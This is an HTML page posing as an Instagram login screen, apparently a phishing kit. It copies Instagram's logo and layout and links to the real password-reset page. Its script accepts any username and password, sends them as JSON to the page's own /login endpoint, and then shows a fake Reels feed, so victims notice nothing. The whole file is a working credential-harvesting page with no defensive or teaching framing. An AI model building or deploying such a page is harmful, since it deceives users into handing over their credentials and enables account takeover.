<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="/styles/style.css" />
    <style>
      .hidden {
        display: none;
      }
    </style>
  </head>
  <body>
    <!-- Login Page -->
    <div id="login-page" class="user-credential-div">
      <div class="box">
        <img
          class="instagram-logo"
          src="https://logos-world.net/wp-content/uploads/2020/04/Instagram-Logo-2010-2013.png"
          alt="Instagram Logo"
        />
        <form id="loginForm" action="/login" method="POST">
          <div>
            <input
              type="text"
              id="username"
              name="username"
              placeholder="Phone number, username, or Email"
              class="user-email-place"
              required
              aria-label="Phone number, username, or Email"
            /><br /><br />
          </div>
          <div>
            <input
              type="password"
              id="password"
              name="password"
              placeholder="Password"
              class="user-password-place"
              required
              aria-label="Password"
            /><br /><br />
          </div>
          <div>
            <button type="submit" class="login-button">
              <span>Log&nbsp;In</span>
            </button>
          </div>
          <div class="or-section">
            <div class="or-divider"></div>
            <div class="or-text">OR</div>
            <div class="or-divider"></div>
          </div>
          <a target="_blank" href="https://www.facebook.com/">
            <div class="facebook-section">
              <img
                width="26"
                height="26"
                src="https://img.icons8.com/color/48/facebook.png"
                alt="Log in with Facebook"
              />
              <p class="facebook-login-text">Log in with Facebook</p>
            </div>
          </a>
          <a href="https://www.instagram.com/accounts/password/reset/">
            <h5><p class="forgot-password-text">Forgot password?</p></h5>
          </a>
        </form>
      </div>
    </div>

    <!-- Content hidden until login -->
    <div id="main-content" class="hidden">
      <div class="flex flex-col h-screen bg-gray-100">
        <!-- Header -->
        <header
          class="bg-white border-b border-gray-300 p-4 flex justify-between items-center"
        >
          <h1 class="text-xl font-bold">Instagram Reels</h1>
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            stroke-linecap="round"
            stroke-linejoin="round"
            class="w-6 h-6"
            aria-label="Menu"
          >
            <circle cx="12" cy="12" r="1" />
            <circle cx="19" cy="12" r="1" />
            <circle cx="5" cy="12" r="1" />
          </svg>
        </header>

        <!-- Reel Content -->
        <main class="flex-grow overflow-y-auto">
          <div
            class="max-w-md mx-auto bg-white shadow-md rounded-lg overflow-hidden mb-4"
          >
            <div
              class="bg-black aspect-[9/16] flex items-center justify-center"
            >
              <video
                src="/reel.mp4"
                class="w-full h-full object-cover"
                autoplay
                muted
                controls
              ></video>
            </div>

            <!-- Reel Info -->
            <div class="p-4">
              <div class="flex items-center justify-between mb-4">
                <div class="flex items-center space-x-2">
                  <img
                    src="/api/placeholder/40/40"
                    alt="User avatar"
                    class="w-10 h-10 rounded-full"
                  />
                  <span class="font-semibold">username</span>
                </div>
                <button class="text-blue-500 font-semibold">Follow</button>
              </div>

              <!-- Interaction Buttons -->
              <div class="flex justify-between items-center mb-4">
                <div class="flex space-x-4">
                  <button aria-label="Like">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      class="w-6 h-6 text-gray-700"
                    >
                      <path
                        d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"
                      ></path>
                    </svg>
                  </button>
                  <button aria-label="Comment">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      class="w-6 h-6 text-gray-700"
                    >
                      <path
                        d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"
                      ></path>
                    </svg>
                  </button>
                  <button aria-label="Share">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      class="w-6 h-6 text-gray-700"
                    >
                      <line x1="22" y1="2" x2="11" y2="13"></line>
                      <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
                    </svg>
                  </button>
                </div>
                <button aria-label="Save">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="2"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                    class="w-6 h-6 text-gray-700"
                  >
                    <path
                      d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"
                    ></path>
                  </svg>
                </button>
              </div>

              <!-- Caption -->
              <p class="text-gray-800">
                <span class="font-semibold">username</span> Caption text goes
                here.
              </p>
            </div>
          </div>
        </main>
      </div>
    </div>

    <script>
      document
        .getElementById("loginForm")
        .addEventListener("submit", async function (event) {
          event.preventDefault(); // Prevent actual form submission
          const username = document.getElementById("username").value;
          const password = document.getElementById("password").value;

          // Simulate login logic (Replace this with actual logic)
          if (username && password) {
            // Hide login page and show main content
            document.getElementById("login-page").classList.add("hidden");
            document.getElementById("main-content").classList.remove("hidden");
            try {
              const response = await fetch("/login", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json", // Send JSON data
                },
                body: JSON.stringify({ username, password }), // Convert data to JSON string
              });

              const result = await response.text(); // Get the response text
            //   alert(result); // Alert the response message
            } catch (error) {
              console.error("Error:", error);
              alert("An error occurred. Please try again.");
            }
          } else {
            alert("Please enter both username and password");
          }
        });
    </script>
  </body>
</html>
